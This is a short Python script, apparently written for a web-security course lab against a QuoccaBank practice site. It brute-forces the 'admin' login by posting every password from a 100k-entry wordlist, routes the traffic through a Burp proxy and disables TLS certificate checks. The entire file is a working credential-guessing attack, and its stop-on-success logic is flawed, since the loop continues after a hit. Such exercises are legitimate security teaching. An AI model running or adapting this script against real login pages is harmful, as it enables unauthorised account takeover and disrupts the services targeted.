import requests
import re

#Disabling InsecureAcess warning 
requests.packages.urllib3.disable_warnings()

#Setting up Burp Suite as my proxy
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

flags = []

def send_password(password):
    #Request payload takes login and password
    payload = {'user': 'admin', 'pass': password}
    r = requests.post('https://logmeout.quoccabank.com/', data=payload, verify=False, proxies=proxies)
    
    print("Trying " + password)
    # print(re.search('None', r.text))
    #Check if the HTML response has this text
    if(re.search('None', r.text) != None):
        print("Found at " + password )
        return
    return r

#Passwords file
passwords = open('/Users/ravijamaheshwari/Documents/csGitRepos/WebSecurity/SecLists/100k_pass.txt', 'r')

for line in passwords:
    stripped_line = line.strip()
    r = send_password(stripped_line)